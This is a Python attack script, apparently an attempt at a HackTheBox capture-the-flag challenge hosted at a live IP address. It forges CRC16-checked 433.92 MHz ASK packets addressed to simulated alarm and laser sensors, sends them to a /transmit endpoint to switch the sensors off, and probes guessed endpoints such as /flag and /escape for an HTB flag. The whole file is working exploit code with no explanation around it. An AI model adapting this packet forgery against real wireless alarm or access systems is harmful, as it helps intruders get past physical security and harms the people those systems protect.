#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 133: Probar concatenar MUCHOS paquetes sin separadores
print("[*] INNOVACIÓN 133: 50 paquetes concatenados")
s = requests.Session()
s.get(base_url)

mega_msg = ''
for _ in range(50):
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        mega_msg += packet

print(f"Mega message length: {len(mega_msg)} chars")
r = s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': mega_msg})

time.sleep(5)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 134: Enviar SOLO a las alarmas, sin tocar los láseres
print("\n[*] INNOVACIÓN 134: Solo alarmas, sin láseres")
s = requests.Session()
s.get(base_url)

for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xF1])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.2)

time.sleep(3)
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f'States after alarms only: {sensor_states}')

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 135: Enviar SOLO a los láseres
print("\n[*] INNOVACIÓN 135: Solo láseres, sin alarmas")
s = requests.Session()
s.get(base_url)

for addr in [0xE1, 0xE2, 0xE3]:
    data = bytes([addr, 0xFF])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.2)

time.sleep(10)  # Esperar más tiempo

# Verificar múltiples endpoints
for endpoint in ['/', '/updates', '/flag', '/escape', '/success']:
    try:
        r = s.get(f'{base_url}{endpoint}')
        if 'HTB{' in r.text:
            print(f'[SUCCESS in {endpoint}]', re.findall(r'HTB\{[^}]+\}', r.text))
            break
        
        sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
        if sensor_states and sensor_states != ['text-warning'] * 4 + ['text-success'] * 3:
            print(f'[+] {endpoint} states changed: {sensor_states}')
    except:
        pass

print("\n[*] Innovaciones 133-135 completadas")
